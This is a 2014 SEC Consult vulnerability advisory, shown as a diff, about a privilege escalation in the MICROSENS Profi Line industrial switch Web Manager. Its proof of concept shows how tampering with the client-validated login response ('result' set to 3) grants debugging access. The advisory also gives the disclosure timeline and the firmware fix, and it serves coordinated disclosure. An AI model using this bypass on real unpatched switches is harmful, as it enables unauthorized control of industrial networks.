@@ -1,0 +1,143 @@
+SEC Consult Vulnerability Lab Security Advisory < 20140228-0 >
+=======================================================================
+title: Privilege escalation vulnerability
+product: MICROSENS Profi Line Modular Industrial Switch Web
+Manager (MS652119PM)
+vulnerable version: Firmware version 10.3.1
+fixed version: Firmware version 10.3.2
+impact: High
+homepage: http://www.microsens.com/profi-line-modular/
+found: 2013-08-21
+by: Christian Kudera, Stefan Riegler
+SEC Consult Vulnerability Lab
+https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"The new Profi Line Modular switches, from MICROSENS, offer maximum
+performance and flexibility in smallest spaces. Robust, modular, expandable
+and designed for greatest reliability and shortest recovery times, the Profi
+Line Modular series has become the first-choice solution for Industrial
+Ethernet."
+
+Source: http://www.microsens.com/profi-line-modular/
+
+Business recommendation:
+------------------------
+SEC Consult has identified a privilege escalation in the MICROSENS Web Manager
+in the course of a very limited infrastructure audit. Very little time was
+spent on the affected product.
+
+The Web Manager can be used with read only permission to check the
+configuration on the device (e.g. VLANs, Port status). Additionally the Web
+Manager can be used with read and write permission to configure the device.
+
+Using the identified vulnerability a low privileged user having read only
+permission can elevate his privileges to contain read and write permissions.
+
+Vulnerability overview/description:
+-----------------------------------
+The Web Manager contains a login form to authenticate a user. The Web Manager
+offers different levels of privilege (e.g. read only permission, read and
+write permission, debugging permission).
+
+The login attempt is checked through a CGI binary, but the response of the
+binary is validated at the client side via JavaScript. An attacker can
+intercept and modify the response of the binary, thus achieving authentication
+and the desired level of authorization. No further validation is performed by
+the Web Manager.
+
+Proof of concept:
+-----------------
+The login generates the following request to the server:
+interf=WEB&bidx=1&unam=root&pawo=&plev=0
+
+This request triggers a CGI binary, which validates the login attempt and
+returns the following response:
+<xml>
+<!-- last change: 17.04.2012 -->
+<!-- returned at uptime of 141056 seconds -->
+<header>
+<version>V0.1</version>
+<user>XYZ</user>
+<date>2012/05/29 17:28:00</date>
+</header>
+
+<response>
+<par name="cmd" type="STRING" >
+<val>login</val>
+</par>
+<par name="result" type="UNSIGNED" >
+<val>255</val>
+</par>
+<par name="lunam" type="STRING" >
+<val>root</val>
+</par>
+<par name="liid" type="STRING" >
+<val>0</val>
+</par>
+<par name="rhost" type="STRING" >
+<val>192.10.100.136</val>
+</par>
+<par name="a_s_b" type="STRING" >
+<val>0_0_1</val>
+</par>
+</response>
+</xml>
+
+The parameter "result" informs the client about the properness of the provided
+login credentials.
+The parameter can correspond to the following values:
+255 login failed
+1 login with read only permission
+2 login with read and write permission
+3 login with debugging permission
+
+For example, if the value of the parameter "result" is changed to 3, the user
+gets logged in with debugging permissions.
+
+Vendor contact timeline:
+------------------------
+2013-09-10: Contacting vendor
+2013-09-11: Sending advisory and proof of concept exploit via encrypted
+channel.
+2013-09-11: Vendor acknowledges receipt of advisory.
+2013-10-18: Vendor responds and wants to release update on 2013-10-31.
+2013-10-31: MICROSENS releases fixed version.
+2014-02-07: Conference call: Clarifying pending questions regarding the fixed
+version.
+2014-02-28: SEC Consult releases coordinated security advisory.
+
+Solution:
+---------
+Update to the most recent firmware version 10.3.2
+
+Workaround:
+-----------
+All accounts with read only permissions should be disabled on the device.
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius
+
+Headquarter:
+Mooslackengasse 17, 1190 Vienna, Austria
+Phone: +43 1 8903043 0
+Fax: +43 1 8903043 15
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+Interested in working with the experts of SEC Consult?
+Write to career (at) sec-consult (dot) com [email concealed]
+
+EOF Christian Kudera / @2014
